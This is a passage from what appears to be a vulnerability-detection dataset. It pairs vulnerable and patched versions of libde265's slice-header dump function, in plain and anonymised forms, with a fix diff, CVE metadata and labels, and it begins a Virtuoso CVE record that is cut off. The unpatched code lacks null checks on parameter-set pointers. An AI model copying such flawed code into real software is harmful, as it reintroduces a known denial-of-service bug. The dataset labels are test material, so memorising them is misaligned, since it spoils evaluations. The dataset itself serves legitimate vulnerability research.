if (VAR_13->sps_temporal_mvp_enabled_flag) {
LOG1(""slice_temporal_mvp_enabled_flag : %d\n"", VAR_32);
}
}
if (VAR_13->sample_adaptive_offset_enabled_flag) {
LOG1(""slice_sao_luma_flag             : %d\n"", VAR_33);
LOG1(""slice_sao_chroma_flag           : %d\n"", VAR_34);
}
if (VAR_20 == VAR_35 || VAR_20 == VAR_36) {
LOG1(""num_ref_idx_active_override_flag : %d\n"", VAR_37);
LOG2(""num_ref_idx_l0_active          : %d %s\n"", VAR_38,
VAR_37 ? """" : ""(from PPS)"");
if (VAR_20 == VAR_36) {
LOG2(""num_ref_idx_l1_active          : %d %s\n"", VAR_39,
VAR_37 ? """" : ""(from PPS)"");
}
if (VAR_11->lists_modification_present_flag && VAR_40 > 1)
{
LOG1(""ref_pic_list_modification_flag_l0 : %d\n"", VAR_41);
if (VAR_41) {
for (int VAR_31=0;VAR_31<VAR_38;VAR_31++) {
LOG2(""  %d: %d\n"",VAR_31,VAR_42[VAR_31]);
}
}
LOG1(""ref_pic_list_modification_flag_l1 : %d\n"", VAR_43);
if (VAR_43) {
for (int VAR_31=0;VAR_31<VAR_39;VAR_31++) {
LOG2(""  %d: %d\n"",VAR_31,VAR_44[VAR_31]);
}
}
}
if (VAR_20 == VAR_36) {
LOG1(""mvd_l1_zero_flag               : %d\n"", VAR_45);
}
LOG1(""cabac_init_flag                : %d\n"", VAR_46);
if (VAR_32) {
LOG1(""collocated_from_l0_flag        : %d\n"", VAR_47);
LOG1(""collocated_ref_idx             : %d\n"", VAR_48);
}
if ((VAR_11->weighted_pred_flag   && VAR_20 == VAR_35) ||
(VAR_11->weighted_bipred_flag && VAR_20 == VAR_36))
{
LOG1(""luma_log2_weight_denom         : %d\n"", VAR_49);
if (VAR_13->chroma_format_idc != 0) {
LOG1(""ChromaLog2WeightDenom          : %d\n"", VAR_50);
}
for (int VAR_51=0;VAR_51<=1;VAR_51++)
if (VAR_51==0 || (VAR_51==1 && VAR_20 == VAR_36))
{
int VAR_52 = (VAR_51==0 ?
VAR_38-1 :
VAR_39-1);
if (false) { 
for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
LOG3(""luma_weight_flag_l%d[%d]        : %d\n"",VAR_51,VAR_31,VAR_53[VAR_51][VAR_31]);
}
if (VAR_13->chroma_format_idc != 0) {
for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
LOG3(""chroma_weight_flag_l%d[%d]      : %d\n"",VAR_51,VAR_31,VAR_54[VAR_51][VAR_31]);
}
}
}
for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
LOG3(""LumaWeight_L%d[%d]             : %d\n"",VAR_51,VAR_31,VAR_55[VAR_51][VAR_31]);
LOG3(""luma_offset_l%d[%d]            : %d\n"",VAR_51,VAR_31,VAR_56[VAR_51][VAR_31]);
for (int VAR_57=0;VAR_57<2;VAR_57++) {
LOG4(""ChromaWeight_L%d[%d][%d]        : %d\n"",VAR_51,VAR_31,VAR_57,VAR_58[VAR_51][VAR_31][VAR_57]);
LOG4(""ChromaOffset_L%d[%d][%d]        : %d\n"",VAR_51,VAR_31,VAR_57,VAR_59[VAR_51][VAR_31][VAR_57]);
}
}
}
}
LOG1(""five_minus_max_num_merge_cand  : %d\n"", VAR_60);
}
LOG1(""slice_qp_delta         : %d\n"", VAR_61);
if (VAR_11->pps_slice_chroma_qp_offsets_present_flag) {
LOG1(""slice_cb_qp_offset     : %d\n"", VAR_62);
LOG1(""slice_cr_qp_offset     : %d\n"", VAR_63);
}
if (VAR_11->deblocking_filter_override_enabled_flag) {
LOG1(""deblocking_filter_override_flag : %d\n"", VAR_64);
}
LOG2(""slice_deblocking_filter_disabled_flag : %d %s\n"",
VAR_65,
(VAR_64 ? ""(override)"" : ""(from pps)""));
if (VAR_64) {
if (!VAR_65) {
LOG1(""slice_beta_offset  : %d\n"", VAR_66);
LOG1(""slice_tc_offset    : %d\n"", VAR_67);
}
}
if (VAR_11->pps_loop_filter_across_slices_enabled_flag  &&
(VAR_33 || VAR_34 ||
!VAR_65)) {
LOG1(""slice_loop_filter_across_slices_enabled_flag : %d\n"",
VAR_68);
}
}
if (VAR_11->tiles_enabled_flag || VAR_11->entropy_coding_sync_enabled_flag) {
LOG1(""num_entry_point_offsets    : %d\n"", VAR_69);
if (VAR_69 > 0) {
LOG1(""offset_len                 : %d\n"", VAR_70);
for (int VAR_31=0; VAR_31<VAR_69; VAR_31++) {
LOG2(""entry point [%i] : %d\n"", VAR_31, VAR_71[VAR_31]);
}
}
}
#undef LOG0
#undef LOG1
#undef LOG2
#undef LOG3
#undef LOG4
}",strukturag/libde265/e36b4a1b0bafa53df47514c419d5be3e8916ebc7/slice.cc/vul/before/0.json,"void slice_segment_header::dump_slice_segment_header(const decoder_context* ctx, int fd) const
{
  FILE* fh;
  if (fd==1) fh=stdout;
  else if (fd==2) fh=stderr;
  else { return; }

#define LOG0(t) log2fh(fh, t)
#define LOG1(t,d) log2fh(fh, t,d)
#define LOG2(t,d1,d2) log2fh(fh, t,d1,d2)
#define LOG3(t,d1,d2,d3) log2fh(fh, t,d1,d2,d3)
#define LOG4(t,d1,d2,d3,d4) log2fh(fh, t,d1,d2,d3,d4)

  LOG0(""----------------- SLICE -----------------\n"");

  const pic_parameter_set* pps = ctx->get_pps(slice_pic_parameter_set_id);
  if (!pps) {
    LOG0(""invalid PPS referenced\n"");
    return;
  }
  assert(pps->pps_read); // TODO: error handling

  const seq_parameter_set* sps = ctx->get_sps((int)pps->seq_parameter_set_id);
  if (!sps) {
    LOG0(""invalid SPS referenced\n"");
    return;
  }
  assert(sps->sps_read); // TODO: error handling


  LOG1(""first_slice_segment_in_pic_flag      : %d\n"", first_slice_segment_in_pic_flag);
  if (ctx->get_nal_unit_type() >= NAL_UNIT_BLA_W_LP &&
      ctx->get_nal_unit_type() <= NAL_UNIT_RESERVED_IRAP_VCL23) {
    LOG1(""no_output_of_prior_pics_flag         : %d\n"", no_output_of_prior_pics_flag);
  }

  LOG1(""slice_pic_parameter_set_id           : %d\n"", slice_pic_parameter_set_id);

  if (!first_slice_segment_in_pic_flag) {
    //if (pps->dependent_slice_segments_enabled_flag) {
      LOG1(""dependent_slice_segment_flag         : %d\n"", dependent_slice_segment_flag);
      //}
    LOG1(""slice_segment_address                : %d\n"", slice_segment_address);
  }

  //if (!dependent_slice_segment_flag)
    {
    //for (int i=0; i<pps->num_extra_slice_header_bits; i++) {
    //slice_reserved_flag[i]

    LOG1(""slice_type                           : %c\n"",
         slice_type == 0 ? 'B' :
         slice_type == 1 ? 'P' : 'I');

    if (pps->output_flag_present_flag) {
      LOG1(""pic_output_flag                      : %d\n"", pic_output_flag);
    }

    if (sps->separate_colour_plane_flag == 1) {
      LOG1(""colour_plane_id                      : %d\n"", colour_plane_id);
    }

    LOG1(""slice_pic_order_cnt_lsb              : %d\n"", slice_pic_order_cnt_lsb);

    if (ctx->get_nal_unit_type() != NAL_UNIT_IDR_W_RADL &&
        ctx->get_nal_unit_type() != NAL_UNIT_IDR_N_LP) {
      LOG1(""short_term_ref_pic_set_sps_flag      : %d\n"", short_term_ref_pic_set_sps_flag);

      if (!short_term_ref_pic_set_sps_flag) {
        LOG1(""ref_pic_set[ %2d ]: "",sps->num_short_term_ref_pic_sets());
        dump_compact_short_term_ref_pic_set(&slice_ref_pic_set, 16, fh);
      }
      else if (sps->num_short_term_ref_pic_sets() > 1) {
        LOG1(""short_term_ref_pic_set_idx           : %d\n"", short_term_ref_pic_set_idx);
        dump_compact_short_term_ref_pic_set(&sps->ref_pic_sets[short_term_ref_pic_set_idx], 16, fh);
      }

      if (sps->long_term_ref_pics_present_flag) {
        if (sps->num_long_term_ref_pics_sps > 0) {
          LOG1(""num_long_term_sps                        : %d\n"", num_long_term_sps);
        }

        LOG1(""num_long_term_pics                       : %d\n"", num_long_term_pics);

#if 0
        for (int i=0; i<num_long_term_sps + num_long_term_pics; i++) {
          LOG2(""PocLsbLt[%d]            : %d\n"", i, ctx->PocLsbLt[i]);
          LOG2(""UsedByCurrPicLt[%d]     : %d\n"", i, ctx->UsedByCurrPicLt[i]);
          LOG2(""DeltaPocMsbCycleLt[%d]  : %d\n"", i, ctx->DeltaPocMsbCycleLt[i]);
        }
#endif
      }

      if (sps->sps_temporal_mvp_enabled_flag) {
        LOG1(""slice_temporal_mvp_enabled_flag : %d\n"", slice_temporal_mvp_enabled_flag);
      }
    }


    if (sps->sample_adaptive_offset_enabled_flag) {
      LOG1(""slice_sao_luma_flag             : %d\n"", slice_sao_luma_flag);
      LOG1(""slice_sao_chroma_flag           : %d\n"", slice_sao_chroma_flag);
    }


    if (slice_type == SLICE_TYPE_P || slice_type == SLICE_TYPE_B) {
      LOG1(""num_ref_idx_active_override_flag : %d\n"", num_ref_idx_active_override_flag);

      LOG2(""num_ref_idx_l0_active          : %d %s\n"", num_ref_idx_l0_active,
           num_ref_idx_active_override_flag ? """" : ""(from PPS)"");

      if (slice_type == SLICE_TYPE_B) {
        LOG2(""num_ref_idx_l1_active          : %d %s\n"", num_ref_idx_l1_active,
             num_ref_idx_active_override_flag ? """" : ""(from PPS)"");
      }

      if (pps->lists_modification_present_flag && NumPocTotalCurr > 1)
        {
          LOG1(""ref_pic_list_modification_flag_l0 : %d\n"", ref_pic_list_modification_flag_l0);
          if (ref_pic_list_modification_flag_l0) {
            for (int i=0;i<num_ref_idx_l0_active;i++) {
              LOG2(""  %d: %d\n"",i,list_entry_l0[i]);
            }
          }

          LOG1(""ref_pic_list_modification_flag_l1 : %d\n"", ref_pic_list_modification_flag_l1);
          if (ref_pic_list_modification_flag_l1) {
            for (int i=0;i<num_ref_idx_l1_active;i++) {
              LOG2(""  %d: %d\n"",i,list_entry_l1[i]);
            }
          }
        }

      if (slice_type == SLICE_TYPE_B) {
        LOG1(""mvd_l1_zero_flag               : %d\n"", mvd_l1_zero_flag);
      }

      LOG1(""cabac_init_flag                : %d\n"", cabac_init_flag);

      if (slice_temporal_mvp_enabled_flag) {
        LOG1(""collocated_from_l0_flag        : %d\n"", collocated_from_l0_flag);
        LOG1(""collocated_ref_idx             : %d\n"", collocated_ref_idx);
      }

      if ((pps->weighted_pred_flag   && slice_type == SLICE_TYPE_P) ||
          (pps->weighted_bipred_flag && slice_type == SLICE_TYPE_B))
        {
          LOG1(""luma_log2_weight_denom         : %d\n"", luma_log2_weight_denom);
          if (sps->chroma_format_idc != 0) {
            LOG1(""ChromaLog2WeightDenom          : %d\n"", ChromaLog2WeightDenom);
          }

          for (int l=0;l<=1;l++)
            if (l==0 || (l==1 && slice_type == SLICE_TYPE_B))
              {
                int num_ref = (l==0 ?
                               num_ref_idx_l0_active-1 :
                               num_ref_idx_l1_active-1);

                if (false) { // do not show these flags
                  for (int i=0;i<=num_ref;i++) {
                    LOG3(""luma_weight_flag_l%d[%d]        : %d\n"",l,i,luma_weight_flag[l][i]);
                  }

                  if (sps->chroma_format_idc != 0) {
                    for (int i=0;i<=num_ref;i++) {
                      LOG3(""chroma_weight_flag_l%d[%d]      : %d\n"",l,i,chroma_weight_flag[l][i]);
                    }
                  }
                }

                for (int i=0;i<=num_ref;i++) {
                  LOG3(""LumaWeight_L%d[%d]             : %d\n"",l,i,LumaWeight[l][i]);
                  LOG3(""luma_offset_l%d[%d]            : %d\n"",l,i,luma_offset[l][i]);

                  for (int j=0;j<2;j++) {
                    LOG4(""ChromaWeight_L%d[%d][%d]        : %d\n"",l,i,j,ChromaWeight[l][i][j]);
                    LOG4(""ChromaOffset_L%d[%d][%d]        : %d\n"",l,i,j,ChromaOffset[l][i][j]);
                  }
                }
              }
        }

      LOG1(""five_minus_max_num_merge_cand  : %d\n"", five_minus_max_num_merge_cand);
    }


    LOG1(""slice_qp_delta         : %d\n"", slice_qp_delta);
    if (pps->pps_slice_chroma_qp_offsets_present_flag) {
      LOG1(""slice_cb_qp_offset     : %d\n"", slice_cb_qp_offset);
      LOG1(""slice_cr_qp_offset     : %d\n"", slice_cr_qp_offset);
    }

    if (pps->deblocking_filter_override_enabled_flag) {
      LOG1(""deblocking_filter_override_flag : %d\n"", deblocking_filter_override_flag);
    }

    LOG2(""slice_deblocking_filter_disabled_flag : %d %s\n"",
         slice_deblocking_filter_disabled_flag,
         (deblocking_filter_override_flag ? ""(override)"" : ""(from pps)""));

    if (deblocking_filter_override_flag) {

      if (!slice_deblocking_filter_disabled_flag) {
        LOG1(""slice_beta_offset  : %d\n"", slice_beta_offset);
        LOG1(""slice_tc_offset    : %d\n"", slice_tc_offset);
      }
    }

    if (pps->pps_loop_filter_across_slices_enabled_flag  &&
        (slice_sao_luma_flag || slice_sao_chroma_flag ||
         !slice_deblocking_filter_disabled_flag)) {
      LOG1(""slice_loop_filter_across_slices_enabled_flag : %d\n"",
           slice_loop_filter_across_slices_enabled_flag);
    }
  }

  if (pps->tiles_enabled_flag || pps->entropy_coding_sync_enabled_flag) {
    LOG1(""num_entry_point_offsets    : %d\n"", num_entry_point_offsets);

    if (num_entry_point_offsets > 0) {
      LOG1(""offset_len                 : %d\n"", offset_len);

      for (int i=0; i<num_entry_point_offsets; i++) {
        LOG2(""entry point [%i] : %d\n"", i, entry_point_offset[i]);
      }
    }
  }

  /*
    if( slice_segment_header_extension_present_flag ) {
    slice_segment_header_extension_length
    for( i = 0; i < slice_segment_header_extension_length; i++)
    slice_segment_header_extension_data_byte[i]
    }
    byte_alignment()
    }
  */

#undef LOG0
#undef LOG1
#undef LOG2
#undef LOG3
#undef LOG4
  //#endif
}","void slice_segment_header::dump_slice_segment_header(const decoder_context* VAR_0, int VAR_1) const
{
  FILE* VAR_2;
  if (VAR_1==1) VAR_2=VAR_3;
  else if (VAR_1==2) VAR_2=VAR_4;
  else { return; }

#define LOG0(VAR_5) log2fh(fh, t)
#define LOG1(VAR_5,VAR_6) log2fh(fh, t,d)
#define LOG2(VAR_5,VAR_7,VAR_8) log2fh(fh, t,d1,d2)
#define LOG3(VAR_5,VAR_7,VAR_8,VAR_9) log2fh(fh, t,d1,d2,d3)
#define LOG4(VAR_5,VAR_7,VAR_8,VAR_9,VAR_10) log2fh(fh, t,d1,d2,d3,d4)

  LOG0(""----------------- SLICE -----------------\n"");

  const pic_parameter_set* VAR_11 = VAR_0->get_pps(VAR_12);
  if (!VAR_11) {
    LOG0(""invalid PPS referenced\n"");
    return;
  }
  assert(VAR_11->pps_read); /* COMMENT_0 */

  const seq_parameter_set* VAR_13 = VAR_0->get_sps((int)VAR_11->seq_parameter_set_id);
  if (!VAR_13) {
    LOG0(""invalid SPS referenced\n"");
    return;
  }
  assert(VAR_13->sps_read); /* COMMENT_0 */


  LOG1(""first_slice_segment_in_pic_flag      : %d\n"", VAR_14);
  if (VAR_0->get_nal_unit_type() >= VAR_15 &&
      VAR_0->get_nal_unit_type() <= VAR_16) {
    LOG1(""no_output_of_prior_pics_flag         : %d\n"", VAR_17);
  }

  LOG1(""slice_pic_parameter_set_id           : %d\n"", VAR_12);

  if (!VAR_14) {
    /* COMMENT_1 */
      LOG1(""dependent_slice_segment_flag         : %d\n"", VAR_18);
      /* COMMENT_2 */
    LOG1(""slice_segment_address                : %d\n"", VAR_19);
  }

  /* COMMENT_3 */
    {
    /* COMMENT_4 */
    /* COMMENT_5 */

    LOG1(""slice_type                           : %c\n"",
         VAR_20 == 0 ? 'B' :
         VAR_20 == 1 ? 'P' : 'I');

    if (VAR_11->output_flag_present_flag) {
      LOG1(""pic_output_flag                      : %d\n"", VAR_21);
    }

    if (VAR_13->separate_colour_plane_flag == 1) {
      LOG1(""colour_plane_id                      : %d\n"", VAR_22);
    }

    LOG1(""slice_pic_order_cnt_lsb              : %d\n"", VAR_23);

    if (VAR_0->get_nal_unit_type() != VAR_24 &&
        VAR_0->get_nal_unit_type() != VAR_25) {
      LOG1(""short_term_ref_pic_set_sps_flag      : %d\n"", VAR_26);

      if (!VAR_26) {
        LOG1(""ref_pic_set[ %2d ]: "",VAR_13->num_short_term_ref_pic_sets());
        dump_compact_short_term_ref_pic_set(&VAR_27, 16, VAR_2);
      }
      else if (VAR_13->num_short_term_ref_pic_sets() > 1) {
        LOG1(""short_term_ref_pic_set_idx           : %d\n"", VAR_28);
        dump_compact_short_term_ref_pic_set(&VAR_13->ref_pic_sets[VAR_28], 16, VAR_2);
      }

      if (VAR_13->long_term_ref_pics_present_flag) {
        if (VAR_13->num_long_term_ref_pics_sps > 0) {
          LOG1(""num_long_term_sps                        : %d\n"", VAR_29);
        }

        LOG1(""num_long_term_pics                       : %d\n"", VAR_30);

#if 0
        for (int VAR_31=0; VAR_31<VAR_29 + VAR_30; VAR_31++) {
          LOG2(""PocLsbLt[%d]            : %d\n"", VAR_31, VAR_0->PocLsbLt[VAR_31]);
          LOG2(""UsedByCurrPicLt[%d]     : %d\n"", VAR_31, VAR_0->UsedByCurrPicLt[VAR_31]);
          LOG2(""DeltaPocMsbCycleLt[%d]  : %d\n"", VAR_31, VAR_0->DeltaPocMsbCycleLt[VAR_31]);
        }
#endif
      }

      if (VAR_13->sps_temporal_mvp_enabled_flag) {
        LOG1(""slice_temporal_mvp_enabled_flag : %d\n"", VAR_32);
      }
    }


    if (VAR_13->sample_adaptive_offset_enabled_flag) {
      LOG1(""slice_sao_luma_flag             : %d\n"", VAR_33);
      LOG1(""slice_sao_chroma_flag           : %d\n"", VAR_34);
    }


    if (VAR_20 == VAR_35 || VAR_20 == VAR_36) {
      LOG1(""num_ref_idx_active_override_flag : %d\n"", VAR_37);

      LOG2(""num_ref_idx_l0_active          : %d %s\n"", VAR_38,
           VAR_37 ? """" : ""(from PPS)"");

      if (VAR_20 == VAR_36) {
        LOG2(""num_ref_idx_l1_active          : %d %s\n"", VAR_39,
             VAR_37 ? """" : ""(from PPS)"");
      }

      if (VAR_11->lists_modification_present_flag && VAR_40 > 1)
        {
          LOG1(""ref_pic_list_modification_flag_l0 : %d\n"", VAR_41);
          if (VAR_41) {
            for (int VAR_31=0;VAR_31<VAR_38;VAR_31++) {
              LOG2(""  %d: %d\n"",VAR_31,VAR_42[VAR_31]);
            }
          }

          LOG1(""ref_pic_list_modification_flag_l1 : %d\n"", VAR_43);
          if (VAR_43) {
            for (int VAR_31=0;VAR_31<VAR_39;VAR_31++) {
              LOG2(""  %d: %d\n"",VAR_31,VAR_44[VAR_31]);
            }
          }
        }

      if (VAR_20 == VAR_36) {
        LOG1(""mvd_l1_zero_flag               : %d\n"", VAR_45);
      }

      LOG1(""cabac_init_flag                : %d\n"", VAR_46);

      if (VAR_32) {
        LOG1(""collocated_from_l0_flag        : %d\n"", VAR_47);
        LOG1(""collocated_ref_idx             : %d\n"", VAR_48);
      }

      if ((VAR_11->weighted_pred_flag   && VAR_20 == VAR_35) ||
          (VAR_11->weighted_bipred_flag && VAR_20 == VAR_36))
        {
          LOG1(""luma_log2_weight_denom         : %d\n"", VAR_49);
          if (VAR_13->chroma_format_idc != 0) {
            LOG1(""ChromaLog2WeightDenom          : %d\n"", VAR_50);
          }

          for (int VAR_51=0;VAR_51<=1;VAR_51++)
            if (VAR_51==0 || (VAR_51==1 && VAR_20 == VAR_36))
              {
                int VAR_52 = (VAR_51==0 ?
                               VAR_38-1 :
                               VAR_39-1);

                if (false) { /* COMMENT_6 */
                  for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
                    LOG3(""luma_weight_flag_l%d[%d]        : %d\n"",VAR_51,VAR_31,VAR_53[VAR_51][VAR_31]);
                  }

                  if (VAR_13->chroma_format_idc != 0) {
                    for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
                      LOG3(""chroma_weight_flag_l%d[%d]      : %d\n"",VAR_51,VAR_31,VAR_54[VAR_51][VAR_31]);
                    }
                  }
                }

                for (int VAR_31=0;VAR_31<=VAR_52;VAR_31++) {
                  LOG3(""LumaWeight_L%d[%d]             : %d\n"",VAR_51,VAR_31,VAR_55[VAR_51][VAR_31]);
                  LOG3(""luma_offset_l%d[%d]            : %d\n"",VAR_51,VAR_31,VAR_56[VAR_51][VAR_31]);

                  for (int VAR_57=0;VAR_57<2;VAR_57++) {
                    LOG4(""ChromaWeight_L%d[%d][%d]        : %d\n"",VAR_51,VAR_31,VAR_57,VAR_58[VAR_51][VAR_31][VAR_57]);
                    LOG4(""ChromaOffset_L%d[%d][%d]        : %d\n"",VAR_51,VAR_31,VAR_57,VAR_59[VAR_51][VAR_31][VAR_57]);
                  }
                }
              }
        }

      LOG1(""five_minus_max_num_merge_cand  : %d\n"", VAR_60);
    }


    LOG1(""slice_qp_delta         : %d\n"", VAR_61);
    if (VAR_11->pps_slice_chroma_qp_offsets_present_flag) {
      LOG1(""slice_cb_qp_offset     : %d\n"", VAR_62);
      LOG1(""slice_cr_qp_offset     : %d\n"", VAR_63);
    }

    if (VAR_11->deblocking_filter_override_enabled_flag) {
      LOG1(""deblocking_filter_override_flag : %d\n"", VAR_64);
    }

    LOG2(""slice_deblocking_filter_disabled_flag : %d %s\n"",
         VAR_65,
         (VAR_64 ? ""(override)"" : ""(from pps)""));

    if (VAR_64) {

      if (!VAR_65) {
        LOG1(""slice_beta_offset  : %d\n"", VAR_66);
        LOG1(""slice_tc_offset    : %d\n"", VAR_67);
      }
    }

    if (VAR_11->pps_loop_filter_across_slices_enabled_flag  &&
        (VAR_33 || VAR_34 ||
         !VAR_65)) {
      LOG1(""slice_loop_filter_across_slices_enabled_flag : %d\n"",
           VAR_68);
    }
  }

  if (VAR_11->tiles_enabled_flag || VAR_11->entropy_coding_sync_enabled_flag) {
    LOG1(""num_entry_point_offsets    : %d\n"", VAR_69);

    if (VAR_69 > 0) {
      LOG1(""offset_len                 : %d\n"", VAR_70);

      for (int VAR_31=0; VAR_31<VAR_69; VAR_31++) {
        LOG2(""entry point [%i] : %d\n"", VAR_31, VAR_71[VAR_31]);
      }
    }
  }

  /* COMMENT_7 */
                                                       
                                         
                                                               
                                               
     
                    
     
    

#undef LOG0
#undef LOG1
#undef LOG2
#undef LOG3
#undef LOG4
  /* COMMENT_15 */
}",strukturag/libde265/e36b4a1b0bafa53df47514c419d5be3e8916ebc7/slice.cc/vul/after/0.json,"--- func_before
+++ func_after
@@ -11,14 +11,23 @@
 #define LOG3(t,d1,d2,d3) log2fh(fh, t,d1,d2,d3)
 #define LOG4(t,d1,d2,d3,d4) log2fh(fh, t,d1,d2,d3,d4)
 
+  LOG0(""----------------- SLICE -----------------\n"");
+
   const pic_parameter_set* pps = ctx->get_pps(slice_pic_parameter_set_id);
+  if (!pps) {
+    LOG0(""invalid PPS referenced\n"");
+    return;
+  }
   assert(pps->pps_read); // TODO: error handling
 
   const seq_parameter_set* sps = ctx->get_sps((int)pps->seq_parameter_set_id);
+  if (!sps) {
+    LOG0(""invalid SPS referenced\n"");
+    return;
+  }
   assert(sps->sps_read); // TODO: error handling
 
 
-  LOG0(""----------------- SLICE -----------------\n"");
   LOG1(""first_slice_segment_in_pic_flag      : %d\n"", first_slice_segment_in_pic_flag);
   if (ctx->get_nal_unit_type() >= NAL_UNIT_BLA_W_LP &&
       ctx->get_nal_unit_type() <= NAL_UNIT_RESERVED_IRAP_VCL23) {","{'deleted_lines': ['  LOG0(""----------------- SLICE -----------------\\n"");'], 'added_lines': ['  LOG0(""----------------- SLICE -----------------\\n"");', '', '  if (!pps) {', '    LOG0(""invalid PPS referenced\\n"");', '    return;', '  }', '  if (!sps) {', '    LOG0(""invalid SPS referenced\\n"");', '    return;', '  }']}",True,Buffer Overflow vulnerability in strukturag libde265 v1.10.12 allows a local attacker to cause a denial of service via the slice_segment_header function in the slice.cc component.,6.5,MEDIUM,1,valid,2023-11-04T14:20:50Z,4
CVE-2023-48950,['CWE-Other'],CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H,1,openlink/virtuoso-opensource,Fixed get argument before place gets mangled when serializing ANY (fixes #1174),696600b5634290e7a5d02bf14f39fbce4a592663,https://github.com/openlink/virtuoso-opensource/commit/696600b5634290e7a5d02bf14f39fbce4a592663,libsrc/Wi/sqlintrp.c,ins_vec_agg,"void
ins_vec_agg (instruction_t * ins, caddr_t * inst)
{
QNCAST (query_instance_t, qi, inst);
caddr_t prev;
int n_sets = qi->qi_n_sets, set, first_set = 0, rc;
data_col_t * res = QST_BOX (data_col_t *, inst, ins->_.agg.result->ssl_index);
db_buf_t set_mask = qi->qi_set_mask;
if (!set_mask)
{
if ((AMMSC_COUNT == ins->_.agg.op || AMMSC_COUNTSUM == ins->_.agg.op   || AMMSC_SUM == ins->_.agg.op)
&& !ins->_.agg.distinct
&& DV_LONG_INT == res->dc_dtp
&& ((SSL_IS_VEC_OR_REF (ins->_.agg.arg)  && DV_LONG_INT == QST_BOX (data_col_t*, inst, ins->_.agg.arg->ssl_index)->dc_sqt.sqt_dtp && !QST_BOX (data_col_t*, inst, ins->_.agg.arg->ssl_index)->dc_any_null)
|| (SSL_CONSTANT == ins->_.agg.arg->ssl_type && DV_LONG_INT == ins->_.agg.arg->ssl_sqt.sqt_dtp)))
{
ins_vec_agg_int_sum (ins, inst);
return;
}
}
if (ins->_.agg.distinct && HA_ORD_DISTINCT == ins->_.agg.distinct->ha_op)
{
ins_vec_agg_ord_distinct (ins, inst);
return;
}
SET_LOOP
{
int set_no = qst_vec_get_int64 (inst, ins->_.agg.set_no, set), op;
caddr_t arg = qst_get (inst, ins->_.agg.arg);
dtp_t arg_dtp = DV_TYPE_OF (arg);
if (DV_DB_NULL == arg_dtp)
continue;
if (ins->_.agg.distinct)
{
itc_ha_feed_ret_t ihfr;
if (DVC_MATCH == itc_ha_feed (&ihfr, ins->_.agg.distinct, inst, 0, NULL))
continue;
}
op = ins->_.agg.op;
qi->qi_set = set_no;
if (res->dc_n_values <= set_no)
{
int inx;
DC_CHECK_LEN (res, set_no);
for (inx = res->dc_n_values; inx <= set_no; inx++)
{
if (AMMSC_MIN == op || AMMSC_MAX == op || AMMSC_SUM == op)
dc_set_null (res, inx);
else
{
dc_append_box (res, (caddr_t)0);
}
}
}
switch (op)
{
case AMMSC_COUNT:
((int64*)res->dc_values)[set_no]++;
break;
case AMMSC_ONE:
if (DC_ANY_IS_NULL (res, set_no))
qst_vec_set_copy (inst, ins->_.agg.result, arg);
break;
case AMMSC_SUM:
prev = qst_get (inst, ins->_.agg.result);
if (DV_DB_NULL == DV_TYPE_OF (prev))
{
qst_set (inst, ins->_.agg.result, box_copy_tree (arg));
VEC_QST_CLR_NULL (inst, ins->_.agg.result, qi->qi_set);
}
else
box_add (prev, arg, inst, ins->_.agg.result);
break;
case AMMSC_MIN:
case AMMSC_MAX:
prev = qst_get (inst, ins->_.agg.result);
rc = cmp_boxes (arg, prev, ins->_.agg.arg->ssl_sqt.sqt_collation, ins->_.agg.arg->ssl_sqt.sqt_collation);
if (DVC_UNKNOWN == rc
|| (rc == DVC_LESS && AMMSC_MIN == ins->_.agg.op)
|| (rc == DVC_GREATER && AMMSC_MAX == ins->_.agg.op))
{
qst_set (inst, ins->_.agg.result, box_copy_tree (arg));
if (DV_DB_NULL != DV_TYPE_OF (arg))
{
VEC_QST_CLR_NULL (inst, ins->_.agg.result, qi->qi_set);
}
}
break;
}
}
END_SET_LOOP;
}","void
ins_vec_agg (instruction_t * VAR_0, caddr_t * VAR_1)
{
QNCAST (VAR_2, VAR_3, VAR_1);
caddr_t VAR_4;
int VAR_5 = VAR_3->qi_n_sets, VAR_6, VAR_7 = 0, VAR_8;
data_col_t * VAR_9 = QST_BOX (data_col_t *, VAR_1, VAR_0->_.agg.result->ssl_index);
db_buf_t VAR_10 = VAR_3->qi_set_mask;
if (!VAR_10)
{
if ((VAR_11 == VAR_0->_.agg.op || VAR_12 == VAR_0->_.agg.op   || VAR_13 == VAR_0->_.agg.op)
&& !VAR_0->_.agg.distinct
&& VAR_14 == VAR_9->dc_dtp
&& ((SSL_IS_VEC_OR_REF (VAR_0->_.agg.arg)  && VAR_14 == QST_BOX (data_col_t*, VAR_1, VAR_0->_.agg.arg->ssl_index)->dc_sqt.sqt_dtp && !QST_BOX (data_col_t*, VAR_1, VAR_0->_.agg.arg->ssl_index)->dc_any_null)
|| (VAR_15 == VAR_0->_.agg.arg->ssl_type && VAR_14 == VAR_0->_.agg.arg->ssl_sqt.sqt_dtp)))
{
ins_vec_agg_int_sum (VAR_0, VAR_1);
return;
}
}
if (VAR_0->_.agg.distinct && VAR_16 == VAR_0->_.agg.distinct->ha_op)
{
ins_vec_agg_ord_distinct (VAR_0, VAR_1);
return;
}
SET_LOOP
{
int VAR_17 = qst_vec_get_int64 (VAR_1, VAR_0->_.agg.set_no, VAR_6), VAR_18;
caddr_t VAR_19 = qst_get (VAR_1, VAR_0->_.agg.arg);
dtp_t VAR_20 = DV_TYPE_OF (VAR_19);
if (VAR_21 == VAR_20)
continue;
if (VAR_0->_.agg.distinct)
{
itc_ha_feed_ret_t VAR_22;
if (VAR_23 == itc_ha_feed (&VAR_22, VAR_0->_.agg.distinct, VAR_1, 0, NULL))
continue;
}
VAR_18 = VAR_0->_.agg.op;
VAR_3->qi_set = VAR_17;
if (VAR_9->dc_n_values <= VAR_17)
{
int VAR_24;
DC_CHECK_LEN (VAR_9, VAR_17);
for (VAR_24 = VAR_9->dc_n_values; VAR_24 <= VAR_17; VAR_24++)
{
if (VAR_25 == VAR_18 || VAR_26 == VAR_18 || VAR_13 == VAR_18)
dc_set_null (VAR_9, VAR_24);
else
{
dc_append_box (VAR_9, (caddr_t)0);
}
}
}
switch (VAR_18)
{
case VAR_11:
((int64*)VAR_9->dc_values)[VAR_17]++;
break;
case VAR_27:
if (DC_ANY_IS_NULL (VAR_9, VAR_17))
qst_vec_set_copy (VAR_1, VAR_0->_.agg.result, VAR_19);
break;
case VAR_13:
